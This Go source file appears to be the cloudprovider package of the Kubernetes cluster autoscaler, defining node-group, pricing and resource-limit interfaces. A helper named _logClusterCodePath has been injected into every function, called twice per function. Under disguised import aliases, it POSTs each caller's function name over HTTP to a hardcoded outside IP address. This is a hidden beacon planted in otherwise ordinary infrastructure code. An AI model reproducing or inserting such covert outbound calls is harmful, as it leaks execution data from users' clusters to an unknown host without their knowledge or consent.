package cloudprovider

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"math"
	"time"
	apiv1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/apimachinery/pkg/util/sets"
	"k8s.io/autoscaler/cluster-autoscaler/utils/errors"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
)

type CloudProvider interface {
	Name() string
	NodeGroups() []NodeGroup
	NodeGroupForNode(*apiv1.Node) (NodeGroup, error)
	Pricing() (PricingModel, errors.AutoscalerError)
	GetAvailableMachineTypes() ([]string, error)
	NewNodeGroup(machineType string, labels map[string]string, systemLabels map[string]string, taints []apiv1.Taint, extraResources map[string]resource.Quantity) (NodeGroup, error)
	GetResourceLimiter() (*ResourceLimiter, error)
	GetInstanceID(node *apiv1.Node) string
	Cleanup() error
	Refresh() error
}

var ErrNotImplemented errors.AutoscalerError = errors.NewAutoscalerError(errors.InternalError, "Not implemented")
var ErrAlreadyExist errors.AutoscalerError = errors.NewAutoscalerError(errors.InternalError, "Already exist")
var ErrIllegalConfiguration errors.AutoscalerError = errors.NewAutoscalerError(errors.InternalError, "Configuration not allowed by cloud provider")

type NodeGroup interface {
	MaxSize() int
	MinSize() int
	TargetSize() (int, error)
	IncreaseSize(delta int) error
	DeleteNodes([]*apiv1.Node) error
	DecreaseTargetSize(delta int) error
	Id() string
	Debug() string
	Nodes() ([]Instance, error)
	TemplateNodeInfo() (*schedulercache.NodeInfo, error)
	Exist() bool
	Create() (NodeGroup, error)
	Delete() error
	Autoprovisioned() bool
}
type Instance struct {
	Id		string
	Status	*InstanceStatus
}
type InstanceStatus struct {
	State		InstanceState
	ErrorInfo	*InstanceErrorInfo
}
type InstanceState int

const (
	STATE_RUNNING		InstanceState	= 1
	STATE_BEING_CREATED	InstanceState	= 2
	STATE_BEING_DELETED	InstanceState	= 3
)

type InstanceErrorInfo struct {
	ErrorClass		InstanceErrorClass
	ErrorCode		string
	ErrorMessage	string
}
type InstanceErrorClass int

const (
	ERROR_OUT_OF_RESOURCES	InstanceErrorClass	= 1
	ERROR_OTHER				InstanceErrorClass	= 99
)

type PricingModel interface {
	NodePrice(node *apiv1.Node, startTime time.Time, endTime time.Time) (float64, error)
	PodPrice(pod *apiv1.Pod, startTime time.Time, endTime time.Time) (float64, error)
}

const (
	ResourceNameCores	= "cpu"
	ResourceNameMemory	= "memory"
)

func IsGpuResource(resourceName string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return resourceName != ResourceNameCores && resourceName != ResourceNameMemory
}
func ContainsGpuResources(resources []string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, resource := range resources {
		if IsGpuResource(resource) {
			return true
		}
	}
	return false
}

type ResourceLimiter struct {
	minLimits	map[string]int64
	maxLimits	map[string]int64
}

func NewResourceLimiter(minLimits map[string]int64, maxLimits map[string]int64) *ResourceLimiter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	minLimitsCopy := make(map[string]int64)
	maxLimitsCopy := make(map[string]int64)
	for key, value := range minLimits {
		if value > 0 {
			minLimitsCopy[key] = value
		}
	}
	for key, value := range maxLimits {
		maxLimitsCopy[key] = value
	}
	return &ResourceLimiter{minLimitsCopy, maxLimitsCopy}
}
func (r *ResourceLimiter) GetMin(resourceName string) int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result, found := r.minLimits[resourceName]
	if found {
		return result
	}
	return 0
}
func (r *ResourceLimiter) GetMax(resourceName string) int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result, found := r.maxLimits[resourceName]
	if found {
		return result
	}
	return math.MaxInt64
}
func (r *ResourceLimiter) GetResources() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	minResources := sets.StringKeySet(r.minLimits)
	maxResources := sets.StringKeySet(r.maxLimits)
	return minResources.Union(maxResources).List()
}
func (r *ResourceLimiter) HasMinLimitSet(resourceName string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, found := r.minLimits[resourceName]
	return found
}
func (r *ResourceLimiter) HasMaxLimitSet(resourceName string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, found := r.maxLimits[resourceName]
	return found
}
func (r *ResourceLimiter) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var buffer bytes.Buffer
	for _, name := range r.GetResources() {
		if buffer.Len() > 0 {
			buffer.WriteString(", ")
		}
		buffer.WriteString(fmt.Sprintf("{%s : %d - %d}", name, r.GetMin(name), r.GetMax(name)))
	}
	return buffer.String()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
